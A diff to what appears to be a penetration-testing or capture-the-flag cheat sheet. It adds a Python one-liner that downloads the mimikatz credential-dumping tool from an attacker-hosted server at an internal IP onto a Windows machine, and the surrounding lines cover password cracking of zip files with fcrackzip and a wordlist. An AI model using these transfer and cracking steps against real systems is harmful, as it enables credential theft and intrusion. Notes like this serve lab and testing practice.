@@ -113,6 +113,10 @@ or more simply, in powershell:
 
 `Invoke-WebRequest -Uri $url -OutFile $output`
 
+using python (if you have it):
+
+`c:\Python27\python.exe -c "import urllib; print urllib.urlopen('http://10.10.50.123:8000/mimikatz_trunk.zip').read()" > mimikatz_trunk.zip`
+
 ## cracking zips
 
 apart from zip2john and john, there is also `fcrackzip -b --method 2 -D -p rockyou.txt -v extracted.zip`
